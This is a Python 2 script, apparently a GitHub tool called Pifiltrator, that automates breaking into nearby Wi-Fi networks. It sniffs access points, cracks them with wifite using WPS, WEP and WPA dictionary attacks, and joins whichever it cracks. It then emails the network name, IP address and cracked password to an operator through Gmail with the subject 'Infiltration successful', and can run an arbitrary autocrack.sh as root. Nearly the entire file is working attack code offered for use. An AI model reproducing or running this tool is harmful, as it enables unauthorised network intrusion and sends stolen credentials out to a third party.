#Pifiltrator by Evanito
#Github - https://github.com/Evanito/Pifiltrator

import csv
import subprocess
from scapy.all import *
import smtplib
import netifaces as ni
import socket
import time
import sys
import os
import argparse
import platform

#Prerequisite check.
if platform.system() != "Linux":
    print "Must be run on a Linux system."
    raise SystemExit
if str(subprocess.check_output(["whereis", "wifite"])) == 'wifite:\n':
    print "Wifite required! (As well as Wifite's dependencies)\nType 'install' below to install:\nWifite, aircrack-ng, Reaver, pyrit, tshark, and cowpatty\nor exit to cancel."
    if raw_input("Type 'install' manually to install...").lower() == "install":
        subprocess.call(["sudo", "apt-get", "install", "wifite", "aircrack-ng", "reaver", "pyrit", "tshark", "cowpatty"])
    else:
        print "User chose not to install, exiting."
        raise SystemExit

# Default Settings, some overwritten by args:
test_server = 'www.google.com'
username = ''
pwd = ''
toaddrs = ''
test_mode = False
wpa_attack = False
wpadriver = 'nl80211,wext' #Use 'wext' and/or 'nl80211'
dictionary = ''
# End settings.

parser = argparse.ArgumentParser()
parser.add_argument("-bg", "--background", help="Run into logfile instead of terminal", action="store_true")
parser.add_argument("-ac", "--autocrack", help="Runs autocrack.sh once connected, after everything else. Fill it with your custom commands.", action="store_true")
parser.add_argument("-i", "--interface", help="Wireless interface to use.")
parser.add_argument("-test", "--testmode", help="Will run tests regardless of need for connection.", action="store_true")
parser.add_argument("-addr", "--address", help="Email address to receive success notification email")
parser.add_argument("-usr", "--username", help="Email address to send notification email from, gmail recommended.")
parser.add_argument("-pwd", "--password", help="Password for email to send notification email")
parser.add_argument("-wpa", "--wpaattack", help="Enable the slower WPA cracking as last resort", action="store_true")
parser.add_argument("-dict", "--dictionary", help="Dictionary to use when WPA cracking")
parser.add_argument("--update", help="Update program from stable branch of GitHub after a success", action="store_true")
args = parser.parse_args()

subprocess.call(["sudo", "clear"])
path = str(os.getcwd())
time_now = time.strftime("%I:%M:%S")
null = open(os.devnull, 'w')
if args.background:
    sys.stdout = open('%s/logs/pifiltrator.log' %(path), 'w')

if args.testmode:
    test_mode = True
if args.address:
    toaddrs = args.address
if args.username:
    username = args.username
if args.password:
    pwd = args.password
if args.wpaattack:
    wpa_attack = True
if args.dictionary:
    dictionary = args.dictionary

print "Pifiltrator by Evanito\n\nStarted, checking for internet..."

def get_iface():
    print 'Scanning for wireless devices since none was stated.'
    proc = subprocess.Popen(['iwconfig'], stdout=subprocess.PIPE, stderr=null)
    iface = ''
    adapters = []
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue
        if ord(line[0]) != 32:  # Doesn't start with space
            iface = line[:line.find(' ')]  # is the interface
        if line.find('Mode:Monitor') == -1:
            if iface not in adapters:
                adapters.append(iface)
    if len(adapters) >= 1:
        print "Using wireless interface: %s" %(adapters[0])
        return adapters[0]
    else:
        print "No wireless interfaces found.\nPlease plug in wireless interface."
        raise SystemExit
if args.interface:
    interface = args.interface
else:
    interface = get_iface()

def is_connected():
    try:
        host = socket.gethostbyname(test_server)
        socket.create_connection((host, 80), 2)
        return True
    except:
        print "No internet."
        return False
    
def mon_mode(iface):
    subprocess.call(["sudo", "ifconfig", iface, "down"])
    subprocess.call(["sudo", "iwconfig", iface, "mode", "Monitor"])
    subprocess.call(["sudo", "ifconfig", iface, "up"])

def man_mode(iface):
    subprocess.call(["sudo", "ifconfig", iface, "down"])
    subprocess.call(["sudo", "iwconfig", iface, "mode", "Managed"])
    subprocess.call(["sudo", "ifconfig", iface, "up"])

def wep_connect(iface, ap, passwd):
    man_mode(iface)
    subprocess.call(["sudo", "iwconfig", iface, "essid", str(ap), "key", str(passwd)]) 
    subprocess.call(["sudo", "dhclient", iface]) 
    print "Done."

def wpa_connect(iface, ap, passwd):
    subprocess.call(["sudo", "service", "network-manager", "stop"])
    man_mode(iface)
    subprocess.call(["sudo", "rm", "%s/wpa_connect.conf" %(path)]) 
    f01 = open("%s/wpa_connect.conf" %(path), "w")
    subprocess.call(["wpa_passphrase", str(ap), str(passwd)], stdout=f01)
    print "Connecting..."
    subprocess.call(["sudo", "wpa_supplicant", "-D%s" %(wpadriver), "-i%s" %(iface), "-c%s/wpa_connect.conf" %(path)])
    print "Done connecting. Getting DHCP..."
    #subprocess.call(["sudo", "dhclient", "-r"])
    subprocess.call(["sudo", "dhclient", iface])
    subprocess.call(["sudo", "service", "network-manager", "start"])
    print "Done."
    subprocess.call(["sudo", "rm", "%s/wpa_connect.conf" %(path)])

def encrypt_type(ap):
    with open('%s/cracked.csv' %(path), mode='r') as knowns:
        reader = csv.reader(knowns)
        encryption = dict((rows[2],rows[1]) for rows in reader)
        return encryption[ap]

def populate_known():
    open('%s/cracked.csv' %(path), mode='a') #Create if it does not exist.
    with open('%s/cracked.csv' %(path), mode='r') as knowns:
        reader = csv.reader(knowns)
        networks = dict((rows[2],rows[3]) for rows in reader)
        return networks

def connect_wifi(iface, ap, passwd):
    if encrypt_type(ap) == 'WPA' or encrypt_type(ap) == 'WPA2':
        wpa_connect(iface, ap, passwd)
    if encrypt_type(ap) == 'WEP':
        wep_connect(iface, ap, passwd)

def send_email():
    if toaddrs != '' and username != '' and pwd != '':
        print "Sending success email..."
        ni.ifaddresses(interface)
        ip = ni.ifaddresses(interface)[2][0]['addr']
        msg = "\r\n".join([
            "From: %s" %(username),
            "To: %s" %(toaddrs),
            "Subject: Infiltration successful",
            "",
            "I'm in. My local IP is %s, Im on the network %s, and the password is %s" %(ip, essid, password)
            ])
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(username, pwd)
        server.sendmail(username, toaddrs, msg)
        server.quit()
        print 'Sent!'
    else:
        print "Email requirements not met. Not sending success email."

def crosscheck():
    networks = populate_known()
    foundone = False
    for found in ap_list:
        if found in networks:
            foundone = True
            essid = found
            password = networks[found]
            break
    if foundone == True:
        return [True, essid, password]
    else:
        return [False]

def updatestable():
    print "UPDATING FROM STABLE BRANCH"
    omitupdatearg = sys.argv
    omitupdatearg.remove("--update") #No infinite update loops
    with open("%s/updatestable.sh" %(path), mode='w') as updatefile:
        updatefile.write("rm pifiltrate.py\n") #Would do this without file, but just in case internet fails, you will still have this as backup.
        updatefile.write("wget https://raw.githubusercontent.com/Evanito/Pifiltrator/master/pifiltrate.py\n")
        updatefile.close()
    subprocess.call(["chmod", "+x", "updatestable.sh"])
    subprocess.call(["sh", "updatestable.sh"])
    print "Restarting script to apply update."
    os.execl(sys.executable, *([sys.executable]+omitupdatearg))
    
def restartscript():
    os.execl(sys.executable, *([sys.executable]+sys.argv))

ap_list = []
def PacketHandler(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.info not in ap_list:
                ap_list.append(pkt.info)
                print "Found AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)


# By the end of this "if" function, the goal is to be connected to the internet.
if is_connected() == False or test_mode == True:
    mon_mode(interface)
    print "Looking for nearby networks..."
    sniff(iface=interface, prn = PacketHandler, timeout=10)
    while ap_list == []:
        time.sleep(30)
        sniff(iface=interface, prn = PacketHandler, timeout=10)
    man_mode(interface)
    print "\n This is what we know:\n%s" %(populate_known()) 
    print "\n And here's what's nearby:\n%s" %(ap_list)
    crosschecked = crosscheck()
    if crosschecked[0] == False:
        print "Wifite time."
        gotem = False
        for ap in ap_list: 
            subprocess.call(["sudo", "wifite", '-wps', '-wep', '-pow', '25', "-i", interface, '-quiet', '-e', ap])
            if ap in populate_known():
                print "Cracked one."
                crosschecked = crosscheck()
                gotem = True
                connect_wifi(interface, crosschecked[1], crosschecked[2])
                if is_connected() == True:
                    print "Connected."
                    break
                else:
                    restartscript()
        if gotem == False and wpa_attack == True:
            subprocess.call(["sudo", "wifite", '-crack', '-dict', dictionary, '-pow', '35', '-mac', "-i", interface, '-quiet', '-wpadt', '30', '-strip', '-aircrack', '-wpa', '-wep'])	
            for ap in ap_list:
                if ap in populate_known():
                    print "Cracked one."
                    crosschecked = crosscheck()
                    gotem = True
                    connect_wifi(interface, crosschecked[1], crosschecked[2])
                    if is_connected() == True:
                        print "Connected."
                        break
                else:
                    restartscript()
        else:
            print "None found..."
        print 'Wifite phase finished.'
    else:
        print "\nWe have one!\n%s ; %s" %(crosschecked[1], crosschecked[2])
        connect_wifi(interface, crosschecked[1], crosschecked[2])

    if is_connected() == True:
        send_email()
    else:
        restartscript()

#Time for post-infiltrate actions.
if is_connected() == True:
    print "Internet Found!"
    if args.update:
        updatestable()
    if args.autocrack:
        open("autocrack.sh", "a")
        subprocess.call(["chmod", "+x", "autocrack.sh"])
        print "!---RUNNING AUTOCRACK.SH---!"
        subprocess.call(["sudo", "sh", "autocrack.sh"])
        print "!-----------DONE-----------!"


